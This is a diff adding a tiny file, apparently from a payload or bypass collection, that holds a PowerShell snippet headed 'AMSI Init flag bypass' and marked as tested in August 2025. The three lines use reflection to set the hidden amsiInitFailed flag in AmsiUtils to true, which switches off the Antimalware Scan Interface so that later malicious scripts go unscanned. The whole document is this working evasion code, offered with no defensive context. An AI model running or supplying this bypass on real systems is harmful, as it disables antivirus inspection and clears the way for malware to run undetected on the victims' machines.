@@ -1,0 +1,8 @@
+============================
+Tested - August 03, 2025
+============================
+# AMSI Init flag bypass
+$u = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$f = $u.GetField("amsiInitFailed", "NonPublic,Static")
+$f.SetValue($null, $true)
+============================
